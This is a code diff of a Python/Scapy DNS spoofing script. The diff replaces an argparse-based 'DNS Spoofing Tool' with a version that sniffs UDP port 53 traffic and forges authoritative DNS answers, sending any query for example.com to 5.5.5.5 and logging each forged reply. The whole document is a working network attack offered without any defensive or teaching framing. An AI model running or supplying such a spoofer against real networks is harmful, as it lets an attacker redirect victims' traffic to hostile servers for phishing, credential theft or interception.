@@ -1,20 +1,19 @@
-from scapy.all import *
-import argparse
+import scapy.all as scapy
+import logging
 
-def dns_spoof(pkt, target_domain, spoof_ip):
-    if pkt.haslayer(DNSQR) and pkt[DNS].qd.qname == target_domain.encode():
-        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) /\
-                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) /\
-                      DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1,\
-                      an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=spoof_ip))
-        send(spoofed_pkt)
-def main():
-    parser = argparse.ArgumentParser(description="DNS Spoofing Tool")
-    parser.add_argument("--target_domain", type=str, required=True, help="Target domain to spoof")
-    parser.add_argument("--spoof_ip", type=str, required=True, help="IP address to redirect to")
-    args = parser.parse_args()
+logging.basicConfig(filename='dns_spoof.log', level=logging.INFO,
+                    format='%(asctime)s - %(message)s')
 
-    print(f"Starting DNS spoofing for {args.target_domain} redirecting to {args.spoof_ip}")
-    sniff(filter="udp port 53", prn=lambda pkt: dns_spoof(pkt, args.target_domain, args.spoof_ip))
-if __name__ == "__main__":
-    main()
+def spoof_dns(packet):
+    if packet.haslayer(scapy.DNSQR):
+        qname = packet[scapy.DNSQR].qname
+        if b"example.com" in qname:
+            spoofed_pkt = scapy.IP(dst=packet[scapy.IP].src, src=packet[scapy.IP].dst) / \
+                          scapy.UDP(dport=packet[scapy.UDP].sport, sport=packet[scapy.UDP].dport) / \
+                          scapy.DNS(id=packet[scapy.DNS].id, qr=1, aa=1, qd=packet[scapy.DNS].qd, 
+                                    an=scapy.DNSRR(rrname=qname, rdata="5.5.5.5"))
+            scapy.send(spoofed_pkt, verbose=0)
+            logging.info(f"Spoofing DNS response for {qname} to IP 5.5.5.5")
+            print(f"Sent spoofed DNS response for {qname}")
+
+scapy.sniff(filter="udp port 53", store=False, prn=spoof_dns)
